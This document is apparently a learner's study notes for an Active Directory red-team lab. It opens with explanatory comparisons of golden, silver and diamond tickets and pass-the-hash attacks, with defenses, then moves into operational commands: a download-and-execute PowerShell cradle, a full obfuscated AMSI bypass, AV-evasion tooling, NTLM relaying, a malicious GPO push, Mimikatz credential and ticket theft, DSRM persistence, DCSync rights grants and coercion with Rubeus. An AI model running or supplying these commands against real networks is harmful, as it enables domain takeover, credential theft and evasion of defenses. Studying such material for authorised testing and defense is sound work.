Here is a comparison of the three major Kerberos ticket attacks in a table format.

| Feature                              | **Golden Ticket**                                                                                                                                | **Silver Ticket**                                                                                                         | **Diamond Ticket**                                                                                                                              |
| :----------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------- |
| **Target Scope**                     | The **entire domain**. A master key for all services and resources.                                                                              | A **single, specific service** (e.g., a file server, SQL database).                                                       | The **entire domain** (like a Golden Ticket).                                                                                                   |
| **What is Forged?**                  | A **Ticket-Granting Ticket (TGT)**. It's a master pass to get other tickets.                                                                     | A **Service Ticket (ST)** for one specific service. It's a key to one room.                                               | A **modified legitimate TGT**. It's a real pass with fake VIP details added.                                                                    |
| **Key Required**                     | The password hash of the **KRBTGT** domain account (the domain's master key).                                                                    | The password hash of the **service account** running the target machine/service.                                          | The password hash of the **KRBTGT** account (to modify the ticket).                                                                             |
| **Involves Domain Controller (DC)?** | **Yes, initially** to get the first TGT, but the forged ticket is then used to communicate directly with the DC for other tickets.               | **No.** The forged ticket is presented directly to the target service, completely bypassing the DC.                       | **Yes, initially** to obtain a legitimate user's TGT, which is then altered.                                                                    |
| **Stealth Level**                    | **Lower.** Ticket requests to the DC for other services are logged, which can create suspicious patterns.                                        | **Very High.** No interaction with the DC during use, so central logs don't capture the forged access.                    | **Highest.** The initial TGT request is a normal, logged event. The final ticket has a legitimate signature, making detection very difficult.   |
| **Primary Use Case**                 | **Domain persistence & total control.** Establishing a long-term, undetectable presence across the network.                                      | **Lateral movement & targeted access.** Quietly accessing a critical server to steal data or move to another machine.     | **Stealthy privilege escalation.** Gaining domain admin rights while generating minimal forensic evidence.                                      |
| **Analogy**                          | **Forging the building manager's master keycard** to access every door and security panel.                                                       | **Making a copy of a specific janitor's key** to get into one secured server room.                                        | **Taking a real employee's keycard, opening it, and swapping its chip** to make it a master key, while keeping the original card's outer shell. |
| **Defense Focus**                    | Protect the KRBTGT account hash at all costs. Monitor for anomalous golden ticket attributes (extremely long lifetimes, non-existent usernames). | Protect service account passwords, implement strong credential management, and monitor service logs for anomalous access. | Monitor for **Kerberos ticket anomalies** (like mismatched encryption types) and unexpected privilege changes within TGTs.                      |

┌──────────────────────────────────────────┐
│          TGT Ticket (الباسبور)          │
├──────────────────────────────────────────┤
│ Part 1: Public Data (بيانات ظاهرة)      │
│   • Username: user123                    │
│   • Expiry: 2024-12-31                   │
├──────────────────────────────────────────┤
│ Part 2: Encrypted Data (المحتوى السري)  │ <<< هنا بيتعمل التغيير!
│   ┌──────────────────────────────────┐   │
│   │        PAC (ملف الصلاحيات)       │   │
│   │   • User SID: S-1-5-21-...-1104  │   │
│   │   • Member of: Domain Users      │→ Diamond بتعدل هنا!
│   │   • Logon Time: 14:30            │   │
│   └──────────────────────────────────┘   │
│                                          │
│   Digital Signature (التوقيع)           │ <<< Diamond تحافظ عليه!
└──────────────────────────────────────────┘


# The "Pass" Attacks: Pass-the-Hash, Pass-the-Ticket, OverPass-the-Hash

## 📊 **Quick Comparison Table**

| Attack | What is "Passed" | What It Bypasses | Authentication Type |
| :--- | :--- | :--- | :--- |
| **Pass-the-Hash (PtH)** | **NTLM Hash** | Password checking | NTLM Authentication |
| **Pass-the-Ticket (PtT)** | **Kerberos Ticket** | Ticket granting process | Kerberos Authentication |
| **OverPass-the-Hash** | **Hashed Password** | Password → Ticket conversion | Kerberos Authentication |

---

## 🔑 **1. Pass-the-Hash (PtH)**

### **The Simple Analogy:**
Imagine you have a **bank safe with a fingerprint scanner**. Instead of needing the actual person's finger, you just need a **copy of their fingerprint**.

- **Normal login**: Type password → System hashes it → Compares to stored hash
- **PtH**: Skip typing password → Use the hash directly as proof

### **How It Works:**
1. **Steal the hash** from memory (LSASS) or a file
2. **Present the hash** to authenticate (instead of password)
3. **System accepts it** because it looks identical to what it stores

### **Key Points:**
- **Works with NTLM protocol** (older Windows auth)
- **Doesn't need to crack the hash** to plaintext password
- **The hash IS the credential**
- **Limited to systems accepting NTLM**

---

## 🎫 **2. Pass-the-Ticket (PtT)**

### **The Simple Analogy:**
Instead of buying a new concert ticket at the booth, you **steal someone else's already-validated ticket** and use it to enter.

### **How It Works:**
1. **Steal a Kerberos ticket** from memory (Ticket Granting Ticket - TGT or Service Ticket)
2. **Inject it into your own session**
3. **Use it to access resources** as that user

### **Types of Tickets Stolen:**
- **TGT (Ticket Granting Ticket)**: Golden! Can get any service ticket
- **Service Ticket**: Access to specific service (like a file share)

### **Key Points:**
- **Works with Kerberos protocol** (modern Windows auth)
- **Ticket must be valid/not expired**
- **No password/hash needed** - ticket itself is enough
- **Stealthier than PtH** (uses normal Kerberos flow)

---

## 🔄 **3. OverPass-the-Hash**

### **The Bridge Between PtH and Kerberos:**
Think of it as **"trading in your counterfeit fingerprint for an official government ID card"**.

### **How It Works:**
1. **Start with an NTLM hash** (stolen via PtH techniques)
2. **Use the hash to request a Kerberos TGT** 
3. **Get legitimate Kerberos tickets** from Domain Controller
4. **Now use Pass-the-Ticket** with legitimate tickets

### **The Technical Process:**
```
[Stolen NTLM Hash] 
    ↓
[Authenticate to DC with hash]  ← "Over" the hash to Kerberos
    ↓
[DC issues legitimate Kerberos TGT]  
    ↓
[Use TGT to get service tickets]  ← Normal Kerberos flow
    ↓
[Pass-the-Ticket to access resources]
```

### **Why It's Powerful:**
- **Turns NTLM hash into Kerberos tickets**
- **Gets legitimate DC-issued tickets** (not stolen)
- **Bypasses NTLM restrictions** (some systems require Kerberos)
- **Harder to detect** than PtH (uses normal Kerberos)

---

## 🎯 **Comparison in Practice:**

### **Scenario: Accessing a File Server**

| Method | Steps |
| :--- | :--- |
| **Normal Login** | Type password → Get TGT → Get service ticket → Access |
| **Pass-the-Hash** | Use stolen hash → Authenticate via NTLM → Access |
| **Pass-the-Ticket** | Use stolen ticket → Access directly |
| **OverPass-the-Hash** | Use stolen hash → Get TGT from DC → Get service ticket → Access |

---

## ⚠️ **Why These Attacks Work:**

### **Common Root Cause:**
Windows stores credentials in memory for **Single Sign-On (SSO)** convenience:
- **Hashes** in LSASS process
- **Tickets** in Kerberos ticket cache
- Once in memory, they can be **dumped and reused**

### **Authentication Design Flaw:**
- Systems can't distinguish between:
  - **Fresh authentication** (user typing password now)
  - **Reused credential** (stolen hash/ticket from yesterday)

---

## 🛡️ **Defense Strategies:**

| Attack | Primary Defenses |
| :--- | :--- |
| **Pass-the-Hash** | • Disable NTLM where possible<br>• Use Credential Guard<br>• Limit local admin rights<br>• Monitor unusual NTLM auth |
| **Pass-the-Ticket** | • Use Protected Users group<br>• Limit ticket lifetimes<br>• Monitor ticket requests<br>• Implement AES encryption (not RC4) |
| **OverPass-the-Hash** | • Monitor Kerberos TGT requests with unusual pre-auth<br>• Use AES encryption for Kerberos<br>• Protected Users group prevents hash extraction |

---

## 💡 **Real-World Analogy:**

**At a Company Building:**

- **Pass-the-Hash** = Using a copied keycard chip code to open doors
- **Pass-the-Ticket** = Stealing someone's daily visitor pass
- **OverPass-the-Hash** = Using the copied keycard code to get a new, legitimate visitor pass from reception, then using that

**The building security might detect the copied keycard (PtH) but won't question the legitimate-looking visitor pass from reception (OverPass)!**






# Tools and scripts 
kerbrute-master
Rubeus.exe 
impacket in /usr/share/doc/python3-impacket/
powerup script
bloodhound
enum4linux
evil-winrm
responder


Load a PowerShell script using dot sourcing
. C:\AD\PowerView.ps1

A module (or a script) can be imported with:
Import-Module C:\AD\ActiveDirectory.psd1

All the commands in a module can be listed with:
Get-Command -Module module-name

Check out Invoke-CradleCrafter:
https://github.com/danielbohannon/Invoke-CradleCrafter

Download execute cradle
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

PowerShell Detections
• System-wide transcription
• Script Block logging
• AntiMalware Scan Interface (AMSI)
• Constrained Language Mode (CLM) - Integrated with AppLocker and WDAC (Device Guard)

15 ways to bypass PowerShell execution policy
https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershellexecution-policy

We will use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.

We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) or DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary or script that Windows Defender may flag.

For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation). That is used for obfuscating the AMSI bypass in the course!

More on PowerShell obfuscation - https://github.com/t3l3machus/PowerShell-Obfuscation-Bible

We can find the line number of the detected part using ByteToLineNumber.ps1 script , we get the byte after Scan using DefenderCheck

We must rename Invoke-Mimikatz before scanning with AmsiTrigger or we get an access denied.

Rebuild a powerkatz dll from Mimikatz source and use ProtectMyTooling to obfuscate the powerkatz dll
ProtectMyTooling: https://github.com/mgeeky/ProtectMyTooling

A repo of popular Offensive C# tools - https://github.com/Flangvik/SharpCollection

Tools such as Codecepticon (https://github.com/Accenture/Codecepticon) can also obfuscate the source code to bypass any signature-related detection.

A great tool to obfuscate the compiled binary is ConfuserEx (https://mkaring.github.io/ConfuserEx/)
ConfuserEx is a free .NET obfuscator, which can stop AVs from performing signature based detection.

CsWhispers - https://github.com/rasta-mouse/CsWhispers
Original NetLoader - https://github.com/Flangvik/NetLoader
We are using NetLoader with CsWhispers project to add D/Invoke and indirect syscall execution as NetLoader uses classic Process Injection WinAPIs which is flagged on basic import table analysis.



# Active Directory Enumeration 

---

For enumeration we can use the following tools

The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
https://github.com/samratashok/ADModule
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

BloodHound (C# and PowerShell Collectors)
https://github.com/BloodHoundAD/BloodHound

PowerView (PowerShell)
https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1
. C:\AD\Tools\PowerView.ps1

SharpView (C#) - Doesn't support filtering using Pipeline
https://github.com/tevora-threat/SharpView/

For enumerating shares, we can also use PowerHuntShares
(https://github.com/NetSPI/PowerHuntShares).

Use SOAPHound for even more stealth
https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/
https://github.com/FalconForceTeam/SOAPHound

For enumerating shares, we can also use PowerHuntShares
(https://github.com/NetSPI/PowerHuntShares).

It can discover shares, sensitive files, ACLs for shares, networks, computers, identities etc. and generates a nice HTML report.
```
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```


ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
```
. C:\AD\Tools\RACE-master\RACE.ps1
```

 RACE is a PowerShell module for executing ACL attacks against Windows targets and Active Directory. RACE can be used for persistence and on demand privilege escalationon Windows machines.
https://github.com/samratashok/RACE


Unconstrained Delegation

Discover domain computers which have unconstrained delegation enabled using PowerView:
```
Get-DomainComputer -UnConstrained
```
then lets connect with it with our normal user, and run this to get all tgt in this server:
```
SafetyKatz.exe "sekurlsa::tickets /export"
Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000 -Administrator@krbtgt -DOLLARCORP.MONEYCORP.LOCAL.kirbi"
```

constrained Delegation

Enumerate users and computers with constrained delegation enabled Using PowerView
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```




[282]

---
[117]
# Lab 

The lab manual uses the following AMSI bypass:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"(( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

If you load PowerView and the ADModule in same PowerShell session, some functions may not work


runs **NTLM Relay Attack** using the Impacket tool `ntlmrelayx.py`
```
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```
It sets up a **relay server** that intercepts NTLM authentication attempts and forwards them to a target system to gain unauthorized access

1. **`-t ldaps://172.16.2.1`**
    - Target: Relays captured credentials to the LDAPS service on IP 172.16.2.1
    - LDAPS = LDAP over SSL (port 636)
2. **`-wh 172.16.100.x`**
    - WPAD (Web Proxy Auto-Discovery) host spoofing
    - Tricks clients into thinking this is the proxy configuration server
3. **`--http-port '80,8080'`**
    - Listens for HTTP connections on ports 80 and 8080
    - These are common web ports where browsers might send NTLM auth
4. **`-i`**
    - Interactive mode - opens a shell if successful
5. **`--no-smb-server`**
    - Doesn't start an SMB server (only HTTP listeners)

## **The Attack Flow:**

1. The tool waits for clients to connect to ports 80/8080
2. When a client connects and attempts NTLM authentication
3. The tool **relays** those credentials to the target LDAPS server (172.16.2.1)


**GPOddity**, a tool for **Group Policy Object (GPO) exploitation** to achieve privilege escalation in Active Directory.
```
sudo python3 gpoddity.py -- gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100. x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```

It creates a **malicious Group Policy** that will add a user to the local administrators group on all computers that apply the GPO.

1. **`--gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147'`**
    - Target GPO ID to modify (must exist in AD)
2. **`--domain 'dollarcorp.moneycorp.local'`**
    - Target domain
3. **`--username 'studentx' --password '...'`**
    - Credentials with permissions to modify GPOs
4. **`--command 'net localgroup administrators studentx /add'`**
    - The malicious command to execute
    - Adds `studentx` to local administrators group on target machines
5. **`--rogue-smbserver-ip '172.16.100.x'`**
    - Attacker's IP where malicious files will be hosted
    - `x` should be replaced with actual number
6. **`--rogue-smbserver-share 'stdx-gp'`**
    - SMB share name on attacker's machine
7. **`--dc-ip '172.16.2.1'`**
    - Domain Controller IP
8. **`--smb-mode none`**
    - No SMB authentication required for the rogue server




run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt.

we need to escalate to domain admin using derivative local admin.
Let’s find out the machines on which we have local admin privileges.
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```



to abuse the DSRM credential for persistence. 
you must be Domain Admin
We can persist with administrative access to the DC once we have Domain Admin privileges by abusing the DSRM administrator.

The DSRM administrator is not allowed to logon to the DC from network. So, we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

we can use Pass-The-Hash (not OverPass-The-Hash) for the DSRM administrator
```
SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```
Note that we are using PowerShell Remoting with IP address and Authentication - 'NegotiateWithImplicitCredential' as we are using NTLM authentication. So, we must modify TrustedHosts
```
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
```

to access the DC :
```
Enter-PSSession -ComputerName 172.16.2.1 - Authentication NegotiateWithImplicitCredential
```



check if studentx has replication rights (DCSync)
```
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights - match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
```

If the studentx does not have replication rights, let's add the rights.

```
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```



Find a server in the dcorp domain where Unconstrained Delegation is enabled
```
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

to do this attack i sould have admin in this server , so check if my accout is admin or no :
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain
```

important step :
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
```
this command help me to run this command :
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
to help me to run file in other server and monitor until authentication from dcorp-dc$

then you can **Use the Printer Bug for Coercion** to force authentication from dcorp-dc$
```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
this command will send Base64EncodedTicket of  dcorp-dc$ to Rubeus monitor

Copy the base64 encoded ticket and use it with Rubeus
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args /ptt /ticket:doIFx…
```

Now, we can run DCSync
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe - args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
you will get Hash NTLM and aes256_hmac  of krbtgt account 

**Use the Windows Search Protocol (MS-WSP) for Coercion** to force authentication from dcorp-dc$
the Windows Search Service is enabled by default on client machines but not on servers
Setup Rubeus in monitor mode exactly as we did for the Printer Bug. On the student VM, use the following command to force dcorp-dc to connect to dcorp-appsrv:

```
C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

**Use the Distributed File System Protocol (MS-DFSNM) for Coercion** to force authentication from dcorp-dc$
If the target has DFS Namespaces service running, we can use that too for coercion
Note that this is detected by MDI

```
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```



To enumerate users with constrained delegation
```
Get-DomainUser -TrustedToAuth
```

enumerate the computer accounts with constrained delegation enabled

```
Get-DomainComputer -TrustedToAuth
```








---

# Privilege Escalation
Tools :
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/itm4n/PrivescCheck
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Run all checks from :
- PowerUp
```
Invoke-AllChecks
```
- Privesc:
```
Invoke-PrivEscCheck
```
- PEASS-ng:
```
winPEASx64.exe
```


Services Issues using PowerUp :

Get services with unquoted paths and a space in their name.
```
Get-ServiceUnquoted -Verbose
```
Get services where the current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```
Get the services whose configuration current user can modify.
```
Get-ModifiableService -Verbose
```


